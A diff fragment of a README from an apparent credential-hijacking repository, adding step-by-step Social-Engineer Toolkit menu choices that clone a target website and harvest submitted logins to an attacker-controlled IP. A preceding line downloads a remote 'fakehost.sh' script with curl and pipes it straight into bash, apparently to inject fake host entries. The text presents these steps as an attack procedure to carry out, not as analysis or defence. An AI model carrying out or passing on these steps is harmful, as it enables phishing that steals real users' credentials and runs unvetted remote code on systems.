@@ -27,5 +27,31 @@ setoolkit
 curl -s https://raw.githubusercontent.com/nu11secur1ty/SSTC-HTTPS-hijack-login-credentials/master/Attacker/hosts_fake_inject/fakehost.sh | bash
 ```
 
+4. - setoolkit
+```bash
+setoolkit
+1) Social-Engineering Attacks
+     set>1
+     enter
+2) Website Attack Vectors
+     set>2
+     enter
+3) Credential Harvester Attack Method
+     set:webattack>3
+     enter
+2) Site Cloner
+     set:webattack>2
+     enter
+set:webattack> IP address for the POST back in Harvester/Tabnabbing [10.10.10.100]:_your_local_layer2_IP_
+     enter
+[-] Example: http://www.thisisafakesite.com
+set:webattack> Enter the url to clone: _your_site_
+     enter
+     enter
+```
+
+
+
+
 
 
